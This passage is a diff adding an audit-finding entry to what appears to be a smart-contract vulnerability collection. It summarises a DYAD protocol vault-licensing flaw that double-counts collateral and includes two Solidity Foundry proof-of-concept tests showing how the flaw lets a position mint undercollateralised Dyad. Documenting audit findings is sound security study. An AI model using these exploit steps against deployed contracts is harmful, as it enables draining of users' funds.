@@ -1336,3 +1336,63 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 22. [High] Design flaw and mismanagement in vault licensing leads to double counting in collateral ratios and positions collateralized entirely with kerosine
+
+### vaultLicenser checks
+
+- Summary: The function `getNonKeroseneValue()` mistakenly includes both exogenous and endogenous collateral due to an incorrect licensing check `vaultLicenser`, leading to inflated USD values and collateral ratios. This allows users to mint Dyad with insufficient exogenous collateral, risking its depegging.
+
+- Impact & Recommendation: Implementing two separate mappings—one for price calculations (classic vaults) and another for licensing (kerosene vaults)—resolves this.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-dyad#h-01-design-flaw-and-mismanagement-in-vault-licensing-leads-to-double-counting-in-collateral-ratios-and-positions-collateralized-entirely-with-kerosine) & [Report](https://code4rena.com/reports/2024-04-dyad)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+      function test_CanMintSameAmountAsDeposit() public {
+        // address RECEIVER2 = makeAddr("Receiver2");
+        uint256 id = mintDNft();
+        uint256 id2 = mintDNft();
+        // Add vault in both contracts
+        vaultManagerV2.add(id, address(wethVaultV2));
+        vaultManagerV2.add(id2, address(wethVaultV2));
+        vaultManagerV2.addKerosene(id, address(wethVaultV2));
+        // Deposits 1e25 USD of Weth
+        depositV2(weth, id, address(wethVaultV2), 1e22);// Price weth 1000
+        // Mint 1e25
+        vaultManagerV2.mintDyad(id, 1e25, RECEIVER);
+        // Protocol considers that User has deposited twice the amount in the collateral ratio calculation
+        console.log("CR of position", vaultManagerV2.collatRatio(id)); // 200%
+        // Position is not liquidatable even if it is only collateralized at 100%
+        vm.expectRevert(IVaultManager.CrTooHigh.selector);
+        vm.prank(RECEIVER);
+        vaultManagerV2.liquidate(id, id2);
+    }
+
+  ```
+
+  ```solidity
+      function test_addKeroseneAsExoColl() public {
+        uint256 id = mintDNft();
+        uint256 id2 = mintDNft();
+        // Follow script deployment. Weth Vault is licensed in both VaultManager and KerosineManager
+        // A user can just add his id and the WethVault in the kerosine mapping and kerosineVault in the vault mapping
+        vaultManagerV2.addKerosene(id, address(wethVaultV2));
+        vaultManagerV2.add(id, address(unboundedKerosineVault));
+        // Assume weth was deposited by other users
+        depositV2(weth, id2, address(wethVaultV2), 1e24); //weth 1000 Usd
+        // User deposits kerosine using id
+        kerosineMock.mint(address(this), 1e20);
+        kerosineMock.approve(address(vaultManagerV2), 1e20);
+        vaultManagerV2.deposit(id, address(unboundedKerosineVault), 1e20);
+        console.log("Kerosine price", unboundedKerosineVault.assetPrice()); //9999
+        //Then mint dyad
+        vaultManagerV2.mintDyad(id, 1e19, RECEIVER);
+        // => Position 150% collateralized with kerosine tokens
+        // !! User cannot add kerosine bounded or unbounded vaults in the kerosine mapping in the vault Manager
+        // !! and id and weth vault can be added in both kerosene and normal vaults which would make the amount deposited calculated twice in the collateralRatio
+    }
+
+  ```
+
+  </details>
